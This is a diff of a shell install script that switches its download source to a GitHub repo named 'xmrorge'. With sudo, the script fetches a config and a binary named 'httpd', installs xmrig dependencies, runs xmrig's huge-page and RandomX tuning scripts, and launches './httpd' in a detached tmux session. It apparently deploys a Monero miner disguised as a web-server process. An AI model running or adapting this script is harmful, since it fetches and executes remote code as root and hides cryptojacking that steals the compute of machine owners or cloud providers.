@@ -10,7 +10,7 @@ else
 
 echo "script da install , chay thoi "
 sudo rm config.json
-sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.json
+sudo wget https://raw.githubusercontent.com/minnie1311/xmrorge/master/config.json
 sudo tmux new-session -d -s my_session1  './httpd'
 
 fi
@@ -21,8 +21,8 @@ fi
 
 sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 sudo rm config.json
-sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.json
-sudo wget https://github.com/minnie1311/azureAI/raw/master/httpd
+sudo wget https://raw.githubusercontent.com/minnie1311/xmrorge/master/config.json
+sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
